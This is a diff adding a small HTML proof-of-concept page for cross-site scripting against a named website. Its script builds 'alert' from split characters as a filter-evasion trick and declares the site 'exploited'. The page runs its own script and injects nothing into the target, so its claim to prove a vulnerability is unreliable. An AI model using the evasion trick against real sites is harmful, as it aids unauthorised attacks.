@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>PoC: XSS Exploit on bumba.global</title>
+</head>
+<body>
+  <h1>💥 XSS PoC - Executed Successfully</h1>
+  <p>If you see a red background and alert, the site is vulnerable.</p>
+
+  <script>
+    // Basic WAF evasion using split + join + DOM
+    var payload = 'a' + 'l' + 'e' + 'r' + 't';
+    var exec = window[payload];
+    exec('💥 Vulnerable to XSS due to missing CSP!');
+    document.body.style.backgroundColor = '#ff0000'; // visual proof
+    document.title = "✅ XSS Exploited!";
+  </script>
+</body>
+</html>
